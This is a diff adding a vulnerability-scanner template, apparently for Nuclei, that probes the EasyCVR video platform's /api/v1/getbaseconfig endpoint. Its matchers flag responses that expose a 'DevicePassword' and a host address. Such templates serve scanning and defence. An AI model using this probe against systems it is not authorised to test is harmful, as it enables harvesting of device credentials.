@@ -1,0 +1,29 @@
+id: poc-yaml-easy-cvr-getbaseconfig-info-leak
+info:
+  name: EasyCVR Video Management Platform getbaseconfig Info Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak,easycvr
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/getbaseconfig"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: regex
+        part: body
+        regex:
+          - "\"DevicePassword\": \"[0-9a-zA-Z]+\""
+          - "\"Host\": \"[0-9.]+\""
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
